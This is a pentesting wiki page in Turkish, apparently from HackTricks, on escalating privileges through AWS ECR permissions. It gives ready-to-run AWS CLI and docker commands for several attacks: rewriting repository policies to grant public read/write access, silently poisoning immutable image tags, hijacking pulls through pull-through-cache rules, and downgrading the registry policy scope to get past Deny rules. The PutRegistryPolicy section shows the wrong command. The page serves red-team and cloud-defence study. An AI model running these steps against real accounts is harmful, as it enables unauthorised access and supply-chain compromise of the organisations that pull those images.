# AWS - ECR Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## ECR

### `ecr:GetAuthorizationToken`,`ecr:BatchGetImage`

Bu izinlere sahip bir saldırgan **`ecr:GetAuthorizationToken`** ve **`ecr:BatchGetImage`** ile ECR'ye giriş yapıp imajları indirebilir.

For more info on how to download images:

{{#ref}}
../../aws-post-exploitation/aws-ecr-post-exploitation/README.md
{{#endref}}

**Olası Etki:** Trafik içindeki hassas bilgileri yakalayarak dolaylı privesc.

### `ecr:GetAuthorizationToken`, `ecr:BatchCheckLayerAvailability`, `ecr:CompleteLayerUpload`, `ecr:InitiateLayerUpload`, `ecr:PutImage`, `ecr:UploadLayerPart`

Tüm bu izinlere sahip bir saldırgan **ECR'ye giriş yapıp imaj yükleyebilir**. Bu, bu imajların kullanıldığı diğer ortamlarda ayrıcalıkları yükseltmek için kullanılabilir.

To learn how to upload a new image/update one, check:

{{#ref}}
../../aws-services/aws-eks-enum.md
{{#endref}}

### `ecr-public:GetAuthorizationToken`, `ecr-public:BatchCheckLayerAvailability, ecr-public:CompleteLayerUpload`, `ecr-public:InitiateLayerUpload, ecr-public:PutImage`, `ecr-public:UploadLayerPart`

Önceki bölümle aynı, ancak halka açık depolar için.

### `ecr:SetRepositoryPolicy`

Bu izne sahip bir saldırgan **değiştirebilir** **depo** **politikasını** kendine (veya hatta herkese) **okuma/yazma erişimi** verecek şekilde.\
Örneğin, bu örnekte okuma erişimi herkese verilmiştir.
```bash
aws ecr set-repository-policy \
--repository-name <repo_name> \
--policy-text file://my-policy.json
```
İçeriği `my-policy.json`:
```json
{
"Version": "2008-10-17",
"Statement": [
{
"Sid": "allow public pull",
"Effect": "Allow",
"Principal": "*",
"Action": [
"ecr:BatchCheckLayerAvailability",
"ecr:BatchGetImage",
"ecr:GetDownloadUrlForLayer"
]
}
]
}
```
### `ecr-public:SetRepositoryPolicy`

Önceki bölüme benzer, ancak kamuya açık depolar içindir.\
Bir saldırgan, bir ECR Public repository'sinin **repository policy**'sini değiştirerek yetkisiz halka açık erişim sağlayabilir veya ayrıcalıklarını yükseltebilir.
```bash
# Create a JSON file with the malicious public repository policy
echo '{
"Version": "2008-10-17",
"Statement": [
{
"Sid": "MaliciousPublicRepoPolicy",
"Effect": "Allow",
"Principal": "*",
"Action": [
"ecr-public:GetDownloadUrlForLayer",
"ecr-public:BatchGetImage",
"ecr-public:BatchCheckLayerAvailability",
"ecr-public:PutImage",
"ecr-public:InitiateLayerUpload",
"ecr-public:UploadLayerPart",
"ecr-public:CompleteLayerUpload",
"ecr-public:DeleteRepositoryPolicy"
]
}
]
}' > malicious_public_repo_policy.json

# Apply the malicious public repository policy to the ECR Public repository
aws ecr-public set-repository-policy --repository-name your-ecr-public-repo-name --policy-text file://malicious_public_repo_policy.json
```
**Potential Impact**: ECR Public repository'ye yetkisiz genel erişim — herhangi bir kullanıcının image'ları push, pull veya delete etmesine izin verir.

### `ecr:PutRegistryPolicy`

Bu izne sahip bir saldırgan, **registry policy**'yi **change** ederek kendisine, hesabına (veya hatta herkese) **read/write access** verebilir.
```bash
aws ecr set-repository-policy \
--repository-name <repo_name> \
--policy-text file://my-policy.json
```
### ecr:CreatePullThroughCacheRule

ECR Pull Through Cache (PTC) kurallarını, saldırganın kontrolündeki upstream namespace'ini güvenilen bir private ECR öneğiyle eşlemek için kötüye kullanın. Bu, private ECR'den çeken iş yüklerinin private ECR'ye herhangi bir push yapılmaksızın saldırgan görüntülerini şeffaf şekilde almasını sağlar.

- Gerekli izinler: ecr:CreatePullThroughCacheRule, ecr:DescribePullThroughCacheRules, ecr:DeletePullThroughCacheRule. Eğer ECR Public upstream kullanıyorsanız: ecr-public:* ile public repo oluşturma/push yapma.
- Test edilen upstream: public.ecr.aws

Adımlar (örnek):

1. ECR Public içinde saldırgan görüntüsü hazırlayın
# Get your ECR Public alias with: aws ecr-public describe-registries --region us-east-1
docker login public.ecr.aws/<public_alias>
docker build -t public.ecr.aws/<public_alias>/hacktricks-ptc-demo:ptc-test .
docker push public.ecr.aws/<public_alias>/hacktricks-ptc-demo:ptc-test

2. Güvenilen bir öneki public registry'ye eşlemek için private ECR'de PTC kuralı oluşturun
aws ecr create-pull-through-cache-rule --region us-east-2 --ecr-repository-prefix ptc --upstream-registry-url public.ecr.aws

3. Saldırgan görüntüsünü private ECR yolu üzerinden çekin (private ECR'ye push yapılmadı)
docker login <account_id>.dkr.ecr.us-east-2.amazonaws.com
docker pull <account_id>.dkr.ecr.us-east-2.amazonaws.com/ptc/<public_alias>/hacktricks-ptc-demo:ptc-test
docker run --rm <account_id>.dkr.ecr.us-east-2.amazonaws.com/ptc/<public_alias>/hacktricks-ptc-demo:ptc-test

Potential Impact: Seçilen önek altındaki dahili image isimlerini ele geçirerek tedarik zinciri kompromisi. Bu öneği kullanan private ECR'den görüntü çeken herhangi bir iş yükü saldırgan kontrollü içerik alacaktır.

### `ecr:PutImageTagMutability`

Bu izni, tag immutability'ye sahip bir repository'yi mutable hale getirip trusted tag'leri (ör. latest, stable, prod) saldırgan kontrollü içerikle üzerine yazmak için kötüye kullanın.

- Gerekli izinler: `ecr:PutImageTagMutability` artı push yetenekleri (`ecr:GetAuthorizationToken`, `ecr:InitiateLayerUpload`, `ecr:UploadLayerPart`, `ecr:CompleteLayerUpload`, `ecr:PutImage`).
- Etki: Tag isimlerini değiştirmeden immutable tag'leri sessizce değiştirerek tedarik zinciri kompromisi.

Adımlar (örnek):

<details>
<summary>Mutability'yi değiştirerek immutable bir tag'i zehirleyin</summary>
```bash
REGION=us-east-1
REPO=ht-immutable-demo-$RANDOM
aws ecr create-repository --region $REGION --repository-name $REPO --image-tag-mutability IMMUTABLE
acct=$(aws sts get-caller-identity --query Account --output text)
aws ecr get-login-password --region $REGION | docker login --username AWS --password-stdin ${acct}.dkr.ecr.${REGION}.amazonaws.com
# Build and push initial trusted tag
printf 'FROM alpine:3.19\nCMD echo V1\n' > Dockerfile && docker build -t ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod . && docker push ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod
# Attempt overwrite while IMMUTABLE (should fail)
printf 'FROM alpine:3.19\nCMD echo V2\n' > Dockerfile && docker build -t ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod . && docker push ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod
# Flip to MUTABLE and overwrite
aws ecr put-image-tag-mutability --region $REGION --repository-name $REPO --image-tag-mutability MUTABLE
docker push ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod
# Validate consumers pulling by tag now get the poisoned image (prints V2)
docker run --rm ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod
```
</details>


#### Küresel registry hijack ROOT Pull-Through Cache rule aracılığıyla

Özel ECR registry'sinin kökünü upstream public registry'ye eşlemek için özel `ecrRepositoryPrefix=ROOT` kullanarak bir Pull-Through Cache (PTC) kuralı oluşturun (ör. ECR Public). Özel registry'de var olmayan bir repository'ye yapılan herhangi bir pull, upstream'den şeffaf şekilde servis edilir; bu, private ECR'ye push yapmadan supply-chain hijacking'e olanak tanır.

- Gerekli izinler: `ecr:CreatePullThroughCacheRule`, `ecr:DescribePullThroughCacheRules`, `ecr:DeletePullThroughCacheRule`, `ecr:GetAuthorizationToken`.
- Etkisi: `<account>.dkr.ecr.<region>.amazonaws.com/<any-existing-upstream-path>:<tag>` adresine yapılan pull'lar başarılı olur ve upstream kaynaklı private repository'leri otomatik oluşturur.

> Not: `ROOT` kuralları için `--upstream-repository-prefix`'i belirtmeyin. Belirtirseniz doğrulama hatası oluşur.

<details>
<summary>Demo (us-east-1, upstream public.ecr.aws)</summary>
```bash
REGION=us-east-1
ACCT=$(aws sts get-caller-identity --query Account --output text)

# 1) Create ROOT PTC rule mapping to ECR Public (no upstream prefix)
aws ecr create-pull-through-cache-rule \
--region "$REGION" \
--ecr-repository-prefix ROOT \
--upstream-registry-url public.ecr.aws

# 2) Authenticate to private ECR and pull via root path (triggers caching & auto repo creation)
aws ecr get-login-password --region "$REGION" | docker login --username AWS --password-stdin ${ACCT}.dkr.ecr.${REGION}.amazonaws.com

# Example using an official mirror path hosted in ECR Public
# (public.ecr.aws/docker/library/alpine:latest)
docker pull ${ACCT}.dkr.ecr.${REGION}.amazonaws.com/docker/library/alpine:latest

# 3) Verify repo and image now exist without any push
aws ecr describe-repositories --region "$REGION" \
--query "repositories[?repositoryName==docker/library/alpine]"
aws ecr list-images --region "$REGION" --repository-name docker/library/alpine --filter tagStatus=TAGGED

# 4) Cleanup
aws ecr delete-pull-through-cache-rule --region "$REGION" --ecr-repository-prefix ROOT
aws ecr delete-repository --region "$REGION" --repository-name docker/library/alpine --force || true
```
</details>

### `ecr:PutAccountSetting` (`REGISTRY_POLICY_SCOPE`'u düşürerek registry policy Deny'larını bypass etme)

`ecr:PutAccountSetting`'i kullanarak registry policy scope'u `V2` (policy tüm ECR eylemlerine uygulanır) durumundan `V1` (`CreateRepository`, `ReplicateImage`, `BatchImportUpstreamImage` için uygulanır) durumuna geçirin. Kısıtlayıcı bir registry policy Deny, `CreatePullThroughCacheRule` gibi eylemleri engelliyorsa, scope'u `V1`'e düşürmek bu uygulamayı kaldırır ve identity‑policy Allow'lar etkili olur.

- Gerekli perms: `ecr:PutAccountSetting`, `ecr:PutRegistryPolicy`, `ecr:GetRegistryPolicy`, `ecr:CreatePullThroughCacheRule`, `ecr:DescribePullThroughCacheRules`, `ecr:DeletePullThroughCacheRule`.
- Etki: Scope'u geçici olarak `V1` olarak ayarlayarak daha önce registry policy Deny ile engellenen ECR eylemlerini gerçekleştirme yeteneği (ör. PTC kuralları oluşturma).

Steps (example):

<details>
<summary>CreatePullThroughCacheRule'daki registry policy Deny'ı V1'e geçerek bypass etme</summary>
```bash
REGION=us-east-1
ACCT=$(aws sts get-caller-identity --query Account --output text)

# 0) Snapshot current scope/policy (for restore)
aws ecr get-account-setting --name REGISTRY_POLICY_SCOPE --region $REGION || true
aws ecr get-registry-policy --region $REGION > /tmp/orig-registry-policy.json 2>/dev/null || echo '{}' > /tmp/orig-registry-policy.json

# 1) Ensure V2 and set a registry policy Deny for CreatePullThroughCacheRule
aws ecr put-account-setting --name REGISTRY_POLICY_SCOPE --value V2 --region $REGION
cat > /tmp/deny-ptc.json <<'JSON'
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "DenyPTCAll",
"Effect": "Deny",
"Principal": "*",
"Action": ["ecr:CreatePullThroughCacheRule"],
"Resource": "*"
}
]
}
JSON
aws ecr put-registry-policy --policy-text file:///tmp/deny-ptc.json --region $REGION

# 2) Attempt to create a PTC rule (should FAIL under V2 due to Deny)
set +e
aws ecr create-pull-through-cache-rule \
--region $REGION \
--ecr-repository-prefix ptc-deny-test \
--upstream-registry-url public.ecr.aws
RC=$?
set -e
if [ "$RC" -eq 0 ]; then echo "UNEXPECTED: rule creation succeeded under V2 deny"; fi

# 3) Downgrade scope to V1 and retry (should SUCCEED now)
aws ecr put-account-setting --name REGISTRY_POLICY_SCOPE --value V1 --region $REGION
aws ecr create-pull-through-cache-rule \
--region $REGION \
--ecr-repository-prefix ptc-deny-test \
--upstream-registry-url public.ecr.aws

# 4) Verify rule exists
aws ecr describe-pull-through-cache-rules --region $REGION \
--query "pullThroughCacheRules[?ecrRepositoryPrefix=='ptc-deny-test']"

# 5) Cleanup and restore
aws ecr delete-pull-through-cache-rule --region $REGION --ecr-repository-prefix ptc-deny-test || true
if jq -e '.registryPolicyText' /tmp/orig-registry-policy.json >/dev/null 2>&1; then
jq -r '.registryPolicyText' /tmp/orig-registry-policy.json > /tmp/_orig.txt
aws ecr put-registry-policy --region $REGION --policy-text file:///tmp/_orig.txt
else
aws ecr delete-registry-policy --region $REGION || true
fi
aws ecr put-account-setting --name REGISTRY_POLICY_SCOPE --value V2 --region $REGION
```
</details>

{{#include ../../../../banners/hacktricks-training.md}}
